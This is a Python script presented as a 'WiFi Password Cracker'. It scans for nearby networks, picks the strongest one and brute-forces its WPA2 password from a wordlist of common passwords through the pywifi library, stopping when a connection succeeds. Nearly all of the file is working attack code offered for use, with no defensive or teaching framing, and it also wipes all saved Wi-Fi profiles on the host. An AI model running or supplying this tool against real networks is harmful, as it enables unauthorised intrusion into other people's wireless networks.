#                       Wifi Password Cracker Tool
#                       main feature of this tool is to brute force the given txt file trying
#                       to find match with wifi password
#                       after finding the match it connects to the wifi

# Importing Libraries
import subprocess
import os.path
import platform
import time
import pywifi #<--------- pywifi is a module for wifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
import pyfiglet

result = pyfiglet.figlet_format("WiFi "
                                "Password"
                                " Cracker")
print(result)

RED= "\033[1;31m"
BLUE= "\033[1;34m"
CYAN= "\033[1;36m"
GREEN= "\033[0;32m"
BOLD= "\033[;1m"
#-------------------------------Start of Program Code--------------------------------------------------------------------

# wordlist of common passwords, retrieved from secList
path_to_file = r"probable-v2-wpa-top4800.txt"
# print available WiFi networks
# using the check_output() for having the network term retrieval
devices = subprocess.check_output(['netsh','wlan','show','network'])

# decode it to strings
devices = devices.decode('ascii')
devices= devices.replace("\r","")

# displaying the information
print(BOLD,CYAN,devices)

#interact with the wifi interface
try:
    # Interface information
    wifi_obj = PyWiFi()
    # Get fist wireless card, Index number 0 is for wifi
    ifaces = wifi_obj.interfaces()[0]
    # get strongest near WiFi name
    client_ssid = ifaces.scan_results()[0].ssid
    print(BOLD,CYAN,"- Trying to Connect to Nearst WiFi:",client_ssid)
    #Create a wireless objects
    wifi_obj = pywifi.PyWiFi()
    wifi_ = wifi_obj.interfaces()[0]

except Exception as e:
    print(BOLD,RED,"<!> Error "+str(e))

# open passwords file to check / brute force
def pwdCheck(ssid, file):
    number = 0
    with open(file, 'r') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            startConnection(ssid, pwd, number)


# Every password enter this function:
def startConnection(ssid, password, number):
    # create profile instance
    profile = Profile()
    # name of client
    profile.ssid = ssid
    # Encryption type
    profile.auth = const.AUTH_ALG_OPEN
    # type of Encryption
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    # type of cipher/ unit of Encryption
    profile.cipher = const.CIPHER_TYPE_CCMP

    # use given password
    profile.key = password
    # remove all the profiles which are previously connected to device
    wifi_.remove_all_network_profiles()
    # add new profile
    new_connection = wifi_.add_network_profile(profile)
    # trying to Connect
    wifi_.connect(new_connection)
    time.sleep(0.5)
    try:
        # Get the connection status of the current network card
        status= ifaces.status()
        # If status equal to 4 then it is connected.
        # Status types:
        # status = 0: not connected
        # status = 1: scanning
        # status = 2: delay
        # status = 3: connecting
        # status = 4: connected
        if status == const.IFACE_CONNECTED: # (True) when password from file equals the wifi password
            time.sleep(1)
            print(BOLD, GREEN, f'[{number}] Crack success using {password}!')
            print(BOLD, BLUE , '- Connecting to the network '+client_ssid)
            exit(0)
        else:
            time.sleep(0.5)
            print(BLUE,f'[{number}] Failed to Connect to %s' %client_ssid)
            print(RED, f'- Crack Failed using {password}')
            return False


    except Exception as e:
        print(BOLD,RED,"Error",str(e))



def StartCrack(client_ssid, path_to_file):

    print(BLUE)
    ssid = client_ssid
    filee = path_to_file
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")
    print(BLUE, "[~] Cracking...")
    pwdCheck(ssid, filee)


path=""
theirs=True

# Asking the user if he wants to use his own brute force wordlist, or the wordlist given in the program.
print(BOLD,CYAN,"\n\t Enter [1] to use our Wordlist \n\t [2] to Enter your Wordlist :")
choicep = input("\nChoice: ")
# mismatch input handling
while choicep not in ['1', '2']:
    print(BOLD,RED,"\nInvalid choice, Choose either 1 or 2:")
    choicep = input()
if choicep == '1':
    theirs = False
if choicep == '2':
    while True:
        print(BOLD,CYAN,"\nPlease enter the path:") # Taking wordlist file path from user
        path = input()
        # validate the path
        b = os.path.exists(path)
        if b == True:
            break
        if b == False:
            print(BOLD,RED,f"\nSorry, this path: {path}, does not exists.")
            print(BOLD,CYAN,"\t[1] try again \n\t[2] exit and use our wordlist")
            print(BOLD,CYAN,"Choice: ")
            choicce = input()
            while choicce not in ['1', '2']:
                choicce = input(BOLD,BLUE,"Invalid choice, Choose 1 or 2:")
            if choicce == '2':
                theirs = False
                break

if theirs == True:
    StartCrack(client_ssid, path)
else:
    StartCrack(client_ssid, path_to_file)
